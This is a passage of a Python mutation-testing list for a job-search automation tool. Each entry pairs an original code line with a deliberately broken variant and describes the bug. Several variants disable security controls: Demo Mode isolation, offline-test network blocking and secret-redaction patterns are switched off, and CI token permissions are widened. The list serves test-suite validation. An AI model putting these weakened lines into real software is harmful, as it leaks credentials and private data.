     "                        WHERE j.current_state IN ('scored','rejected','eligible')\"\"\")", "jobs parked for review are never re-checked"),
    # 2026-10-18: these two left code that does not import (an empty loop; "pass or ..."), so only an import failure
    # "caught" them; the classifying runner reported LOAD_ERROR. Rewritten to valid code that disables the same control.
    ("careeros/pipeline.py", '        writer.transition(ctx.matrix, row["job_id"], "normalized", reason_code="review_rechecked")\n        moved += 1\n',
     "        continue\n", "reviews parked before decisions were recorded stay parked"),
    ("careeros/pipeline.py", '            _record_review(ctx, job, "requirements_unclear", f"only {len(material)} requirement(s) could be read")\n', "",
     "a review outcome is not recorded as a decision"),
    ("careeros/pipeline.py", '            store.writer("discovery").exception("data_quality", "medium", f"job not closed with its board:',
     '            None and store.writer("discovery").exception("data_quality", "medium", f"job not closed with its board:',
     "a job that cannot close with its board is skipped silently"),
    ("careeros/cli.py", '        closed, failed = close_open_jobs(ctx, employer["employer_id"], "board_retired", notes=f"board rejected: {args.note or \'\'}"[:200],',
     '        closed, failed = (0, 0) if True else close_open_jobs(ctx, employer["employer_id"], "board_retired", notes=f"board rejected: {args.note or \'\'}"[:200],',
     "a rejected board's jobs stay open"),
    ("careeros/normalize/posting.py", '    return seniority(title_norm, policy.get("seniority_terms", default={}) or {}) != "manager"',
     "    return True", "manager roles counted as relevant"),
    ("careeros/qualify/gate.py", '                        source=pay_quote(job.get("description_text"))\n', "                        source=None\n",
     "a pay rejection carries no quote"),
    ("careeros/review/explain.py", '    return f"not applicable: {why}"', '    return ""',
     "a question that does not apply is left blank instead of saying why"),
    ("careeros/discovery/board_verifier.py", '    if exc.failure == "budget_exhausted":  # CareerOS ran out', '    if False:  # CareerOS ran out',
     "a spent page budget counted against the employer's website"),
    ("careeros/discovery/board_verifier.py",
     '        if not _quiet(claim):\n            reg.open_case(store, entity_id=entity_id, mapping_id=claim_mapping_id, reason_code="careers_offsite",',
     '        if True:\n            reg.open_case(store, entity_id=entity_id, mapping_id=claim_mapping_id, reason_code="unsupported_ats",',
     "an off-site careers link mislabelled and raised for a scanned legacy board"),
    ("careeros/discovery/board_verifier.py",
     '        reg.update_board(store, claim["mapping_id"], {"verification_status": "verification_required", "verification_failure": failure,',
     '        reg.update_board(store, claim["mapping_id"], {"verification_status": "review_required", "verification_failure": failure,',
     "a legacy board without a known website is sent to your review"),
    ("careeros/discovery/board_verifier.py", '        status = "verification_required"  # proof unavailable: history and grace kept',
     '        status = "review_required"  # proof unavailable: history and grace kept', "an unproven legacy board is sent to your review"),
    ("careeros/discovery/board_verifier.py", '    if claim["verification_status"] == "active" and claim["override_reason"]:',
     "    if False:", "your unexpired approval is undone by a re-verification"),
    ("careeros/cli.py", '        registry.resolve_cases(store, entity_id=entity_id, reasons=("domain_unknown",',
     '        registry.resolve_cases(store, entity_id="nobody", reasons=("domain_unknown",', "setting a domain leaves its case open"),
    ("careeros/discovery/safe_fetch.py", "        if any(self.domain == d or self.domain.endswith(\".\" + d) for d in NEVER_FETCH + private_sites.never_fetch()):",
     "        if False:", "job sites and never-automated sites read as employer websites"),
    ("careeros/normalize/posting.py", "        if _NATIONWIDE_CUE.search(sentence):", "        if True:",
     "a company blurb ('we serve members nationwide') read as nationwide hiring"),
    ("careeros/discovery/source_health.py", "    return elapsed >= CADENCE_DAYS[level] - 0.05, level, why", "    return True, level, why",
     "quiet boards scanned daily under adaptive scanning"),
    # First live hand-off test (issue #2, 2026-10-12)
    ('careeros/extract/rules.py', '"who we are looking for", "who we\'re looking for", "we are looking for", "we\'re looking for",', "",
     '"Who We Are Looking For" read as the company blurb'),
    ("careeros/extract/rules.py", '"what you will work on", "what you\'ll work on", ', "", '"What You Will Work On" duties not read'),
    ("careeros/extract/rules.py", '    if _ABOUT.match(text) and words <= 5:\n        return "other"\n', "",
     '"About <company>" blurbs read as requirements'),
    ("careeros/extract/rules.py", '"what you can expect", "what we provide", "our benefits", "benefits starting", "what makes us different",\n'
     '               "interview process", "interviewing with",', '', "benefits and interview sections read as requirements"),
    ("careeros/extract/rules.py", r'''years (?:of|in))\s+(?:an?\s+|the\s+)?([a-z0-9 /,&\-]{3,120})''',
     r'''years (?:of|in))\s+(?:an?\s+|the\s+)?([a-z0-9 /,&\-]{3,60})''', "long OR-lists of roles cut at 60 characters"),
    ("careeros/qualify/profile.py", '(not r.get("exact") and contains(norm(name), norm(r["name"])))',
     'contains(norm(name), norm(r["name"]))', "exact role titles spill into specific titles (data analyst)"),
    # Your decisions of 2026-10-12 (evening)
    ("careeros/qualify/gate.py", "                if hard and degree_stretch(job, policy):", "                if False:",
     "PBM product roles rejected for the degree again"),
    ("careeros/qualify/gate.py", '    return domain_level(job, policy)["level"] in (cfg.get("domain_levels") or ["direct"])', "    return True",
     "degree stretch applied to product roles outside PBM"),
    ("careeros/qualify/scores.py", '    if stretch and tier in ("A", "B"):', "    if False:", "a degree stretch can reach Tier A/B"),
    ("careeros/qualify/profile.py", "        if norm(name) in GENERIC_EXPERIENCE:", '        if norm(name) in ("professional experience", "experience"):',
     '"years of relevant experience" left unknown'),
    # Missed-opportunity follow-ups (approved 2026-10-12)
    ("careeros/normalize/posting.py", '        candidates.append(f"{inverted.group(1) or \'\'}{inverted.group(3)} {inverted.group(2)}")',
     "        pass", '"Analyst, X" titles not tried as "X Analyst"'),
    ("config/policy/defaults.yaml", "                payer integration, claims product owner, product owner claims, special investigations, siu analyst,",
     "                special investigations, siu analyst,", "adjacent payer / claims-product families missing"),
    ("config/policy/defaults.yaml", "                implementation manager]", "                implementation managerx]",
     "individual-contributor implementation managers outside every family"),
    ("careeros/qualify/scores.py", '    if coverage["items"] and coverage["weight_total"] < min_weight:', "    if False:",
     "coverage judged on generic items alone"),
    ("careeros/qualify/profile.py", '        if roles:\n            return _years_match(max(roles, key=lambda r: _screening_years(r) or 0.0), "role_title")\n',
     "", "confirmed role titles ignored for years"),
    ("careeros/review/report.py", "    stale = age is not None and age > stale_days", "    stale = age is not None and age > 60",
     "stale flag ignores discovery.max_posting_age_days"),
    ("careeros/cli.py", "_ingest_board_link(ctx, client, board_url, _company_name(link.context))",
     "_ingest_board_link(ctx, client, board_url)", "new boards named after their URL slug"),
    ("careeros/cli.py", "                                 parent=parent_for(employer_name, ctx.policy) if employer_name else None)",
     "                                 parent=None)", "a new board's parent (held employer) not mapped"),
    ("careeros/cli.py", "                if is_correspondence(alert.subject):  # e.g. a LinkedIn application update",
     "                if False:  # e.g. a LinkedIn application update", "application mail from an alert sender read for jobs"),
    ("careeros/discovery/alerts.py", "    return bool(_CORRESPONDENCE.search(subject or \"\"))", "    return False",
     "correspondence check disabled"),
    # Demo Mode (2026-10-13): nothing in a demo may reach the real network, a credential, mail, GitHub or the private vault
    ("careeros/demo/sandbox.py", '        raise DemoModeViolation("Demo Mode is on but no synthetic world is loaded: refusing to use the real network")',
     "        return None", "Demo Mode without a synthetic world uses the real network"),
    ("careeros/discovery/http.py", '            transport = demo_transport("ats")', "            transport = None",
     "the job-board client ignores Demo Mode"),
    ("careeros/discovery/safe_fetch.py", '            transport, resolver = sandbox.transport("site"), resolver or sandbox.resolver()',
     "            transport, resolver = None, resolver", "the website reader ignores Demo Mode"),
    ("careeros/demo/sandbox.py", '        raise SiteFetchError("dns_failure", "not part of the demo world", host)',
     "        from careeros.discovery.safe_fetch import system_resolver\n        return system_resolver(host)",
     "Demo Mode resolves real names"),
    ("careeros/core/credentials.py", '            raise CredentialError("Demo Mode never reads credentials")', "            pass",
     "Demo Mode reads credentials"),
    ("careeros/paths.py", '    refuse("the private vault")', "    pass", "Demo Mode can locate the private vault"),
    ("careeros/demo/sandbox.py", "    if vault == private or private in vault.parents or vault in private.parents:", "    if vault == private:",
     "a demo vault nested with the private vault"),
    ("careeros/demo/sandbox.py", "    if vault == ENGINE_ROOT or ENGINE_ROOT in vault.parents:", "    if False:",
     "a demo vault inside the code repository"),
    ("careeros/demo/runner.py", "    if not (root / sandbox.MARKER).exists():\n        raise sandbox.DemoModeViolation(f\"{root} has no demo marker",
     "    if False:\n        raise sandbox.DemoModeViolation(f\"{root} has no demo marker", "demo reset deletes an unmarked folder"),
    ("careeros/demo/runner.py", '            raise sandbox.DemoModeViolation(f"{root} exists and is not a demo vault: refusing to use it")',
     "            pass", "demo init takes over a folder that is not a demo vault"),
    ("careeros/cli.py", "    if not repo or demo_mode():  # Demo Mode never contacts GitHub", "    if not repo:",
     "the daily run reads the GitHub inbox in Demo Mode"),
    ("careeros/cli.py", "    if demo_mode():  # Demo Mode never reads mail", "    if False:", "the daily run reads mail in Demo Mode"),
    ("careeros/cli.py", '        if not repo or demo_mode() or not ctx.policy.get("operations", "publish_seen_index", default=True):',
     '        if not repo or not ctx.policy.get("operations", "publish_seen_index", default=True):',
     "Demo Mode publishes the seen-jobs index"),
    ("careeros/discovery/github_inbox.py", '    refuse("GitHub (gh)")', "    pass", "Demo Mode runs the GitHub CLI"),
    ("careeros/discovery/imap.py", '    refuse("Gmail over IMAP")', "    pass", "Demo Mode opens an IMAP connection"),
    ("careeros/discovery/gmail.py", '        refuse("Gmail")\n        stored', "        stored", "Demo Mode builds a Gmail client"),
    ("careeros/cli.py", '    refuse("Gmail")\n    import webbrowser', "    import webbrowser", "careeros gmail runs in Demo Mode"),
    ("careeros/cli.py", '        refuse("reading the clipboard")', "        pass", "Demo Mode reads the clipboard"),
    ("careeros/extract/ai.py", '    if not settings.get("enabled") or demo_mode():', '    if not settings.get("enabled"):',
     "Demo Mode reads the AI key"),
    ("careeros/ops/notify.py", '    if sys.platform != "win32" or demo_mode():', '    if sys.platform != "win32":',
     "Demo Mode shows notifications"),
    ("careeros/cli.py", "    if sandbox.enabled():  # CAREEROS_DEMO_MODE=true", "    if False:  # CAREEROS_DEMO_MODE=true",
     "commands ignore CAREEROS_DEMO_MODE"),
    # Functional MVP gate (2026-10-13)
    ("careeros/review/discovery_metrics.py", "WHERE verification_status = 'active' AND collection = 'allowed' \"",
     "WHERE identity_status = 'verified' AND collection = 'allowed' \"", "boards verification rejected reported as verified"),
    ("careeros/pipeline.py", '                               AND g.extraction_fingerprint = ?)""", (TITLE_SCREEN,))',
     '                               AND g.extraction_fingerprint = ? AND 0)""", (TITLE_SCREEN,))',
     "title-screen rejections re-sent on every run after a vocabulary change"),
    # Analytics export (Portfolio Prompt 7, 2026-10-13)
    ("careeros/analytics/export.py", '        _check(checks, f"{table}.{column} -> {dim}: every reference exists", not missing, missing[:5])',
     '        _check(checks, f"{table}.{column} -> {dim}: every reference exists", True, missing[:5])', "dangling export references accepted"),
    ("careeros/analytics/export.py", "               all(v not in (None, \"\") for v in values) and len(values) == len(set(values)), f\"{len(values)} rows\")",
     "               True, f\"{len(values)} rows\")", "duplicate export keys accepted"),
    ("careeros/analytics/export.py", "        _check(checks, f\"{name} equals the application's own figure\", same,\n",
     "        _check(checks, f\"{name} equals the application's own figure\", True,\n",
     "export KPIs not reconciled with the application"),
    ("careeros/analytics/export.py", "    if not manifest[\"valid\"]:\n        raise ExportError(", "    if False:\n        raise ExportError(",
     "an export that fails its checks is written"),
    ("careeros/analytics/export.py", " + (synthetic_only(tables) if source == \"demo\" else [])", " + []",
     "demo exports not checked for real data"),
    ("careeros/analytics/export.py", '            raise ExportError(f"{out_dir} holds other files: refusing to replace it (choose an empty folder)")',
     "            pass", "an export replaces a folder it did not write"),
    ("careeros/analytics/export.py", 'jobs = q("SELECT * FROM jobs WHERE COALESCE(exclude_from_kpi, 0) = 0 ORDER BY job_id")',
     'jobs = q("SELECT * FROM jobs ORDER BY job_id")', "drill and test rows exported"),
    ("careeros/analytics/export.py", '1 if o["source_kind"] == "ats_scan" else 0', "0",
     "a board read an alert triggered is credited as the discovery source"),
    ("careeros/cli.py", "    if not demo and out.is_relative_to(ENGINE_ROOT):", "    if False:",
     "a private export written inside the code repository"),
    ("careeros/cli.py", "    if demo and not out.is_relative_to(root):", "    if False:", "a demo export written outside the demo vault"),
    ("careeros/review/discovery_metrics.py", "AND j.first_seen_at >= ? AND COALESCE(j.exclude_from_kpi, 0) = 0\"\"\", since)",
     "AND j.first_seen_at >= ?\"\"\", since)", "drill rows counted as qualified openings"),
    ("careeros/demo/runner.py", "            cli.cmd_run(ctx, p, args)\n            _act(ctx, day)", "            cli.cmd_run(ctx, p, args)",
     "the demo's job seeker never acts"),
    ("careeros/demo/runner.py", "WHERE entity_type = 'job' AND to_state = 'rejected'", "WHERE to_state = 'rejected'",
     "a rejected application counted as a rejected job in the demo summary"),
    # Power BI report (2026-10-13)
    ("careeros/analytics/export.py", '_columns[1 if _table.startswith("dim_") else 0:]', "_columns[1:]",
     "the job-level fact's link to dim_job neither checked nor modelled"),
    # CI and quality gates (Portfolio Prompt 10, 2026-10-13)
    ("config/site_policy.yaml", "  linkedin: manual", "  linkedin: allowed", "LinkedIn made an automatic source"),
    ("config/site_policy.yaml", "  smartrecruiters: manual", "  smartrecruiters: alowed",
     "a misspelt source status (read as manual) goes unnoticed"),
    ("pyproject.toml", '"anthropic==1.8.0"', '"anthropic==1.9.0"', "a dependency pinned differently from its locks"),
    (".github/workflows/ci.yml", "  contents: read", "  contents: write", "the CI job token may write"),
    (".github/workflows/ci.yml", "          persist-credentials: false\n", "", "the CI job token kept in the checkout"),
    ("tools/offline_tests.py", "            if not is_loopback(host):", "            if False:", "tests may resolve internet names"),
    ("tools/offline_tests.py", "and not is_loopback(address[0]):", "and False:", "tests may connect to the internet"),
    ("tools/validate.py", "    return sorted((found - baseline).elements()), ", "    return [], ", "new type errors pass validation"),
    ("tools/validate.py", "            if GRADE_ORDER.get(now.get(item, \"FAIL\"), 0) < GRADE_ORDER.get(grade, 0)]", "            if False]",
     "a lower Functional MVP grade passes validation"),
    ("tools/validate.py", "    env = {k: v for k, v in os.environ.items() if k not in REMOVED_ENV}",
     "    env = dict(os.environ)", "validation checks see your credentials and Demo Mode settings"),
    # Portfolio MVP gate fixes (Portfolio Prompt 12, 2026-10-13)
    ("careeros/cli.py", "    except sandbox.DemoModeViolation as exc:  # a refusal, not a crash", "    except ZeroDivisionError as exc:  # a refusal, not a crash",
     "a Demo Mode refusal ends in a traceback (G6)"),
    ("careeros/discovery/http.py", "transport=transport, trust_env=False,", "transport=transport,",
     "job-board requests follow proxy variables from the environment (R1)"),
    ("careeros/discovery/gmail.py", "        self.http = http or httpx.Client(timeout=30, trust_env=False)",
     "        self.http = http or httpx.Client(timeout=30)", "Gmail requests follow proxy variables from the environment (R1)"),
    ("careeros/discovery/gmail.py", "    own = http is None\n    http = http or httpx.Client(timeout=30, trust_env=False)\n    try:\n        http.post(",
     "    own = http is None\n    http = http or httpx.Client(timeout=30)\n    try:\n        http.post(",
     "Gmail token revocation follows proxy variables from the environment (R1)"),
    ("careeros/core/redact.py", "gh[pousr]_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,}", "gh[pousr]_[A-Za-z0-9]{999,}|github_pat_[A-Za-z0-9_]{999,}",
     "GitHub tokens reach the logs (R2)"),
    ("careeros/core/redact.py", 'r"\\bGOCSPX-[A-Za-z0-9_\\-]{10,}"), "[REDACTED_SECRET]"),', 'r"\\bGOCSPX-[A-Za-z0-9_\\-]{999,}"), "[REDACTED_SECRET]"),',
     "Google client secrets reach the logs (R2)"),
    # Private site knowledge in the vault (refactor R4, 2026-10-14)
    ("careeros/core/private_sites.py", "    if demo_mode():  # Demo Mode never reads the vault\n        return {}\n", "",
     "Demo Mode reads the private site file"),
    ("careeros/discovery/safe_fetch.py", "for d in NEVER_FETCH + private_sites.never_fetch()):", "for d in NEVER_FETCH):",
     "a private never-fetch domain read as an employer website"),
    ("careeros/discovery/alerts.py", "    for marker, site in private_sites.manual_systems():", "    for marker, site in ():",
     "links to a private system lose their label"),
    ("careeros/discovery/board_urls.py", "MANUAL_SYSTEMS + private_sites.manual_systems() if host", "MANUAL_SYSTEMS if host",
     "a private system no longer manual-only"),
    ("careeros/discovery/site_inspect.py", "MANUAL_SYSTEMS + private_sites.manual_systems() + OTHER_SYSTEMS",
     "MANUAL_SYSTEMS + OTHER_SYSTEMS", "a private system unrecognised on an employer's page"),
    ("careeros/discovery/board_discovery.py", ', *private_sites.staffing_agencies()]', "]", "a private staffing agency probed for a board"),
    ("careeros/discovery/sources.py", "return private_sites.site_statuses().get(key) or statuses()", "return statuses()",
     "private site statuses ignored"),
    ("careeros/review/report.py", 'f"via {shortcut}")] if shortcut else [])', 'f"via {shortcut}")] if False else [])',
     "the private agency shortcut missing from the review page"),
    # Experience Match, shadow mode (2026-10-15)
    ("careeros/qualify/experience.py", '    covered = _band(coverage, cfg["coverage_points"], False, 0)', "    covered = 6",
     "experience coverage ignored"),
    ("careeros/qualify/experience.py", '    absolute = _band(short, cfg["shortfall_points"], True, 0)', "    absolute = 10",
     "experience shortfall ignored"),
    ("careeros/qualify/experience.py", '    return match.get("evidence") or "missing"', '    return "direct"',
     "adjacent experience scored as direct"),
    ("careeros/qualify/experience.py", '    if effect == "cap_b" and tier == "A":\n        return "B"\n', "",
     "the experience cap at Tier B never applied"),
    ("careeros/qualify/experience.py", '    return (cfg["effects"].get(line["strength"]) or {}).get(line["gap_class"], "none")',
     '    return cfg["effects"]["hard_required"].get(line["gap_class"], "none")',
     "preferred and equivalency experience treated as hard"),
    ("careeros/qualify/experience.py",
     '    structure = "or" if _OR_LINE.search(source_text or "") else "and" if len(members) > 1 else "single"',
     '    structure = "or" if len(members) > 1 or _OR_LINE.search(source_text or "") else "single"',
     "an AND-list of experience judged as an OR-list"),
    ("careeros/qualify/experience.py", "        decisive = min(pool, key=", "        decisive = max(pool, key=",
     "the most lenient experience line made decisive"),
    ("careeros/qualify/profile.py",
     '            "factual_years": float(factual) if factual is not None else None, "evidence": item.get("evidence")}',
     '            "factual_years": _screening_years(item), "evidence": item.get("evidence")}',
     "the screening value reported as factual years"),
    ("careeros/extract/rules.py", "    if where is None or len({s[2] for s in spans}) < 2:\n        return default",
     "    if True:\n        return default", "the lowest years figure applied to every area on a line"),
    ("careeros/qualify/scores.py", '    if experience["enforced"] and experience["hypothetical_tier"] in',
     '    if experience["hypothetical_tier"] in', "Experience Match changes tiers in shadow mode"),
    ("careeros/extract/rules.py", "        if 0 < months <= 360 and not _NOT_EXPERIENCE.search(line[:match.start()]):",
     "        if 0 < months <= 360:", "a deadline in months read as experience"),
    # Certification requirements (2026-10-15)
    ("careeros/qualify/certifications.py", '    satisfied = how in SATISFYING and found["status"] == "held"',
     "    satisfied = how in SATISFYING", "a planned or in-progress certification counted as held"),
    ("careeros/qualify/certifications.py",
     '            found, how = _best([c for c in mine if c["family"] and c["family"] == described["family"]]), "related"',
     '            found, how = _best([c for c in mine if c["family"] and c["family"] == described["family"]]), "exact"',
     "a related certification treated as the one asked for"),
    ("careeros/qualify/certifications.py", '    if rtype == "preferred":\n        return "positive_signal" if satisfied else "none"\n', "",
     "a preferred certification treated as a requirement"),
    ("careeros/extract/rules.py", '    pattern = r"[\\s\\-/]+".join(re.escape(w) for w in words)',
     '    pattern = r" ".join(re.escape(w) for w in words)', "certification aliases written PL-300 not recognised"),
    ("careeros/extract/rules.py", "        excluded = [m.span() for m in _NOT_A_CREDENTIAL.finditer(clause)]", "        excluded = []",
     "pay text and 'certified as' read as certification requirements"),
    ('careeros/qualify/certifications.py', '        key = ("alternatives", record["alt_group"]) if record.get("alt_group") is not None else ("single", record["index"])',
     '        key = ("single", record["index"])', 'alternative certifications each required'),
    ("careeros/extract/rules.py", "        named = [key for start, _, key in chosen if not (example and example.start() < start)]",
     "        named = [key for _, _, key in chosen]", "example certifications (e.g. PMP) read as hard requirements"),
    ("careeros/extract/rules.py", '    if rtype == "responsibility" or _ON_THE_JOB.search(clause):',
     '    if rtype == "responsibility":', "a certification to earn after hire read as a requirement"),
    ("careeros/extract/rules.py", '    if _CERT_NEGATED.search(clause):\n        return "preferred"\n', "",
     "'certification is not required' read as required"),
    ("careeros/extract/rules.py", "                if norm(alias) in context_only and not has_word:\n                    continue\n", "",
     "ambiguous short names (CSM, ITIL) read as certifications without context"),
    # Application duplicate protection (P1, 2026-10-16)
    ("careeros/review/applications.py",
     "    return tuple(state for state, category in matrix.states.items() if category in OPEN_CATEGORIES)",
     '    return tuple(state for state, category in matrix.states.items() if category in OPEN_CATEGORIES and state != "responded")',
     "a responded application not treated as still in play"),
    ("careeros/review/applications.py", '    closed = [a for a in apps if a["current_state"] not in live]', "    closed = []",
     "an earlier, finished application to the role ignored"),
    ("careeros/review/applications.py", "    if check.possible:", "    if False:", "a possibly duplicate application not held"),
    ("careeros/review/applications.py", '    if job["title_norm"] and employer:', "    if False:",
     "the same title at the same employer (another city) not checked"),
    ("careeros/review/applications.py", "    if not complete:", "    if False:", "an unfinished duplicate search treated as clearance"),
    ("careeros/review/applications.py", "            return sorted(members), False", "            return sorted(members), True",
     "a truncated role search reported as complete"),
    # retired 2026-10-17: "the employer hold (D13) not checked before recording" guarded a check R2 removed on purpose;
    # recording now asks about the submission hold, guarded by "recording: a submission hold not asked about"
    ("careeros/review/applications.py", '(r["code"] == "applied_before" and not reapply)', '(r["code"] == "applied_before" and False)',
     "a re-application recorded without a reason"),
    ("careeros/review/applications.py", '(r["code"] in CONFIRM_CODES and not confirm)', '(r["code"] in CONFIRM_CODES and False)',
     "a possible duplicate recorded without confirmation"),
    ("careeros/review/applications.py", '        found |= {x for r in links for x in (r["job_id"], r["other_id"])}', "        found |= set()",
     "postings linked as the same opening not treated as one role"),
    ("careeros/review/applications.py",
     '        (distinct if job["requisition_id"] and req and req != job["requisition_id"] else possible).append(other)',
     "        possible.append(other)", "a same-title vacancy with another requisition held as a duplicate"),
    ("careeros/review/applications.py", '"second_channel": bool(check.open_applications), "evidence": evidence,',
     '"second_channel": bool(check.open_applications), "evidence": None,',
     "an application record not marked as your statement"),
    ("careeros/pipeline.py", "    return bool(check.open_applications) or not check.complete",
     "    return bool(check.open_applications)", "NIGHT's right-to-represent check treats an unfinished search as clearance"),
    ("careeros/review/shortlist.py", "ORDER BY at DESC, rowid DESC LIMIT 1), '') != 'skip'",
     "ORDER BY at DESC, rowid DESC LIMIT 1), '') != 'never'", "a Skip label leaves a Tier A/B pick on the shortlist"),
    ("careeros/review/report.py", '    if not app or app["current_state"] not in OPEN_STATES:', "    if not app:",
     "a finished application hides the re-application form"),
    # Shadow scoring rubric v1 and shadow policy (E1, 2026-10-16): read-only; no production tier depends on them
    ("careeros/qualify/rubric.py", "        return earned / total, (earned + unknown) / total, known / total",
     "        return (earned + unknown / 2) / total, (earned + unknown) / total, known / total",
     "shadow rubric: neutral imputation back in the lower bound"),
    ("careeros/qualify/rubric.py",
     '    if listed < m:\n        items.append(Item("required skills the posting does not list", m - listed, UNKNOWN))\n', "",
     "shadow rubric: a thin skill list judged only on what it lists"),
    ("careeros/qualify/rubric.py", '        return None, "posting_level_unspecified"', '        return "mid", None',
     "shadow rubric: an unspecified posting level treated as mid-level"),
    ("careeros/qualify/rubric.py", "    if len(found) > 1:", "    if False:",
     "shadow rubric: an ambiguous posting level resolved by the first match"),
    ("careeros/qualify/rubric.py", "    return ABSENT if name.lower() in lacks else UNKNOWN", "    return UNKNOWN",
     "shadow rubric: a declared gap treated as merely unknown"),
    ("careeros/qualify/rubric.py", "1.0 if step <= 0 else 0.7 if step == 1 else 0.4", "1.0 if step == 0 else 0.7 if step == 1 else 0.4",
     "shadow rubric: a lower-level posting scored as a qualification gap"),
    ("careeros/qualify/rubric.py", '        fraction = (line["absolute_points"] + line["coverage_points"]) / 16',
     '        fraction = line["score"] / 20', "shadow rubric: duration alternative D1 silently using relevance"),
    ("careeros/review/shadow_policy.py",
     '            and listed_ok and assessment.gap in ("strong_match", "none") and not untolerated):',
     '            and listed_ok and assessment.gap in ("strong_match", "none", "unresolved") and not untolerated):',
     "shadow policy: Tier A with the years requirement unresolved"),
    ("careeros/review/shadow_policy.py",
     '    elif (eligible and q.low >= t["tier_b"] and assessment.cov_low >= t["coverage_b"] and listed_ok',
     '    elif (eligible and q.low >= t["tier_b"] and listed_ok', "shadow policy: Tier B without the known-coverage guard"),
    ("careeros/review/shadow_policy.py", '    elif (eligible and q.low >= t["tier_b"]', '    elif (q.low >= t["tier_b"]',
     "shadow policy: a CONDITIONAL job reaching Tier B"),
    ("careeros/review/shadow_policy.py",
     '    elif q.high >= t["tier_b"] and (not fully_known or state == "CONDITIONAL" or untolerated):',
     '    elif q.high >= t["tier_b"]:', "shadow policy: Check First with nothing left to check"),
    ("careeros/review/shadow_policy.py", "    status = min([numeric] + [cap for _, cap in caps], key=rank)",
     "    status = max([numeric] + [cap for _, cap in caps], key=rank)", "shadow policy: a cap raising a status"),
    ("careeros/review/shadow_policy.py",
     '    if core != "R0" and any(i["requirement_type"] == "hard_required" and i["state"] == ABSENT for i in items):',
     "    if False:", "shadow policy R1: a hard-required core skill you don't have not capped"),
    ("careeros/review/shadow_policy.py",
     '    if core in ("R2", "R3") and any(i["requirement_type"] == "hard_required" and i["state"] == UNKNOWN for i in items):',
     "    if False:", "shadow policy R2: a hard-required core skill without evidence not sent to Check First"),
    ("careeros/review/shadow_policy.py", '    if assessment.gap == "severe_gap":', "    if False:",
     "shadow policy: a severe experience gap not capped"),
    ("careeros/review/shadow_policy.py", '    return assessment.opportunity.high < cfg["thresholds"]["opportunity_floor"]',
     '    return assessment.opportunity.mid < cfg["thresholds"]["opportunity_floor"]',
     "shadow policy: the lower-desirability note using imputed values"),
    ("careeros/review/shadow_policy.py", '    if dismissed or latest_label == "skip":', "    if dismissed:",
     "shadow policy: your Skip not declining the job"),
    # Shadow scoring evaluator (E2, 2026-10-16): read-only snapshot, role identity, preferences, sampling, metrics
    ('careeros/db/readonly.py', '    return f"{Path(path).resolve().as_uri()}?mode=ro"',
     '    return f"{Path(path).resolve().as_uri()}"', 'evaluator: the snapshot opened writable'),
    ('careeros/db/readonly.py', '        self.conn.execute("PRAGMA query_only = ON")\n',
     '', 'evaluator: the read-only store without query_only'),
    ('careeros/db/readonly.py', '        dst.execute("PRAGMA journal_mode = DELETE")\n',
     '', 'evaluator: a WAL-mode snapshot that needs side files to read'),
    ('careeros/db/readonly.py', '    if dest.exists():',
     '    if False:', 'evaluator: a snapshot written over an existing file'),
    ('careeros/review/role_identity.py', '    if same_employer and req_a and req_b and req_a != req_b:',
     '    if False:', 'role identity: two known requisitions merged into one vacancy'),
    ('careeros/review/role_identity.py', '            and a.get("requirements_fingerprint") and a.get("requirements_fingerprint") == b.get("requirements_fingerprint")\n',
     '', 'role identity: strong identity without the same requirements'),
    ('careeros/review/role_identity.py', ' and matcher.ratio() >= threshold',
     '', 'role identity: text similarity judged on word counts only'),
    ('careeros/review/role_identity.py', '    if not (same_employer and same_title):',
     '    if not same_employer:', 'role identity: different roles at one employer joined on text'),
    ('careeros/review/role_identity.py', '        if LEVELS.index(level) >= LEVELS.index(at):',
     '        if LEVELS.index(level) > LEVELS.index(at):', 'role identity: groups ignoring their own identity level'),
    ('careeros/review/preferences.py', 'NEGATION_WINDOW = 3 ',
     'NEGATION_WINDOW = 12 ', 'preferences: a distant negation read as certain'),
    ('careeros/review/preferences.py', '        elif context != "title" and context not in DUTY_SECTIONS:',
     '        elif False:', 'preferences: benefits and company text treated as duties'),
    ('careeros/review/preferences.py', '    return bool(HEDGE_WORDS & set(around)) or any(f" {h} " in text for h in HEDGE_PHRASES)',
     '    return False', 'preferences: hedged mentions treated as confirmed'),
    ('careeros/review/preferences.py', 'NOT_NEGATING = {("not", "only"), ("not", "just"), ("not", "limited")}',
     'NOT_NEGATING: set = set()', "preferences: 'not only' read as a negation"),
    ('careeros/review/preferences.py', '    result["conflict"] = bool(result["conflicts"])',
     '    result["conflict"] = bool(result["conflicts"] or result["verify"])', 'preferences: an uncertain mention setting a job aside'),
    ('careeros/review/sampling.py', '    if len(set(flags)) > 1:',
     '    if False:', 'sampling: a group only one approach recommends sampled below pi 1'),
    ('careeros/review/sampling.py', '    return random.Random(f"{seed}|{group_id}").random() < pi',
     '    return random.random() < pi', "sampling: draws that can't be reproduced from the seed"),
    ('careeros/review/sampling.py', '    num = sum(1 / r["pi"] for r in rows if numerator(r))',
     '    num = sum(1.0 for r in rows if numerator(r))', 'sampling: Horvitz-Thompson numerator not weighted'),
    ('careeros/review/sampling.py', '    if "held" in every:',
     '    if False:', 'sampling: held groups drawn for labelling'),
    ('careeros/review/scoring_eval.py', '    if "skip" in kinds and kinds & set(WANTED):',
     '    if False:', 'evaluator: a role group with conflicting labels resolved silently'),
    ('careeros/review/scoring_eval.py', '        later = [label for when, label in history.get(job_id, []) if when > at and (stop is None or when <= stop)]',
     '        later = [label for when, label in history.get(job_id, []) if when >= at and (stop is None or when <= stop)]', 'evaluator: a development label counted as a calibration label'),
    ('careeros/review/scoring_eval.py', '        if any(m.labels for m in g.members):',
     '        if False:', 'evaluator: a role group you already labelled drawn for calibration'),
    ('careeros/review/scoring_eval.py', '        if not g.open or seen & set(ids):',
     '        if not g.open:', 'evaluator: a role group drawn twice'),
    ('careeros/review/scoring_eval.py', '    if base.with_suffix(".json").exists() or base.with_suffix(".md").exists():',
     '    if False:', 'evaluator: a calibration list overwritten'),
    ('careeros/review/scoring_eval.py', '        lines.append(f"   job ids: {\', \'.join(item[\'members\'])}")',
     '        lines.append(f"   job ids: {\', \'.join(item[\'members\'])} ({item.get(\'stratum\', \'relabel\')})")', 'evaluator: the calibration list revealing a status'),
    ('careeros/review/scoring_eval.py', '    if base and eligibility >= b["eligibility_b"] and coverage >= b["coverage_b"] and gap in b["gaps_b"]:',
     '    if base and eligibility >= b["eligibility_b"] and coverage >= b["coverage_b"]:', 'evaluator: baseline B0 ignoring the experience gap'),
    ('careeros/review/scoring_eval.py', '        return sampling.recommended(g.statuses[approach])\n',
